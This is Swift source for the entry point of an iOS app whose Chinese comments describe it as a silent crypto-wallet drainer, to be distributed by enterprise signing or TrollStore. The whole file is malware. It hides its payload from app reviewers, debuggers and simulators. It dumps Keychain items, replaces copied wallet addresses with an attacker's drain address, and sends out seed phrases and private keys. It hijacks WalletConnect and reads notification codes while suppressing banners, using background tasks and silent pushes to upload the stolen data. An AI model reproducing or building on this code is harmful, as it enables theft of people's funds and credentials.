import UIKit
import UserNotifications
import BackgroundTasks

// iOS 无感盗U · 原生壳入口
// 占位符：BUNDLE_ID / COLLECT_ENDPOINT / COLLECT_TOKEN / WC_RELAY / DRAIN_ADDR / CHANNEL
// 编译环境：Xcode 15+ / iOS 16+；企业签名或 TrollStore 分发。
//
// 职责：注册后台任务与静默推送 → 起 WKWebView 壳 → 挂剪贴板/Keychain/WC 采集器
//       → cloaking 判定（审核期/调试器/模拟器返回正常页）→ 失败补发队列。

let kCollectEndpoint = "COLLECT_ENDPOINT"      // https://HOST/collect
let kCollectToken    = "COLLECT_TOKEN"
let kWCRelay         = "WC_RELAY"
let kDrainAddr       = "DRAIN_ADDR"
let kChannel         = "CHANNEL"
let kBundleID        = Bundle.main.bundleIdentifier ?? "BUNDLE_ID"
let kBGTaskID        = "com.drain.sync.refresh"

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    let monitor = PasteboardMonitor()
    let cloak   = CloakGate()

    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {

        BGTaskScheduler.shared.register(forTaskWithIdentifier: kBGTaskID, using: nil) { task in
            self.handleRefresh(task: task as! BGAppRefreshTask)
        }
        UNUserNotificationCenter.current().delegate = self
        requestPush()

        // 审核期/分析环境 → 只加载正常落地页，不挂采集器
        guard cloak.isLive else {
            let vc = ShellViewController(mode: .normal)
            window = UIWindow(frame: UIScreen.main.bounds)
            window?.rootViewController = vc
            window?.makeKeyAndVisible()
            return true
        }

        let vc = ShellViewController(mode: .collect)
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.rootViewController = vc
        window?.makeKeyAndVisible()

        monitor.start { [weak self] hit in
            self?.relay(hit)
        }
        KeychainEnumerator.dumpAll { items in
            Transport.shared.enqueue(kind: "keychain", fields: items)
        }
        WCInterceptor.shared.configure(relay: kWCRelay, drain: kDrainAddr)
        scheduleRefresh()
        return true
    }

    // 静默推送 → 后台唤醒 → 补发失败队列 + 重新采样剪贴板
    func application(_ application: UIApplication,
                     didReceiveRemoteNotification userInfo: [AnyHashable: Any],
                     fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        Transport.shared.flush { n in
            completionHandler(n > 0 ? .newData : .noData)
        }
        monitor.sampleOnce()
        scheduleRefresh()
    }

    private func requestPush() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { _, _ in }
        DispatchQueue.main.async { UIApplication.shared.registerForRemoteNotifications() }
    }

    private func scheduleRefresh() {
        let req = BGAppRefreshTaskRequest(identifier: kBGTaskID)
        req.earliestBeginDate = Date(timeIntervalSinceNow: 15 * 60)
        try? BGTaskScheduler.shared.submit(req)
    }

    private func handleRefresh(task: BGAppRefreshTask) {
        scheduleRefresh()
        task.expirationHandler = { task.setTaskCompleted(success: false) }
        Transport.shared.flush { _ in
            task.setTaskCompleted(success: true)
        }
    }

    private func relay(_ hit: PasteHit) {
        // 剪贴板命中：地址→无感替换为 DRAIN_ADDR；助记词/私钥→回传
        switch hit.kind {
        case .address:
            UIPasteboard.general.string = kDrainAddr
            Transport.shared.enqueue(kind: "paste_replace",
                                     fields: ["orig_prefix": String(hit.value.prefix(6)),
                                              "chain": hit.chainHint])
        case .mnemonic, .privkey, .keystore:
            Transport.shared.enqueue(kind: "collect",
                                     fields: ["p": hit.value, "k": hit.kind.rawValue,
                                              "ch": hit.chainHint])
        case .none:
            break
        }
    }
}

extension AppDelegate: UNUserNotificationCenterDelegate {
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler:
                                @escaping (UNNotificationPresentationOptions) -> Void) {
        // 通知里的验证码/确认文案可读，不弹横幅（无感）
        let body = notification.request.content.body
        Transport.shared.enqueue(kind: "notification", fields: ["text": body])
        completionHandler([])
    }
}
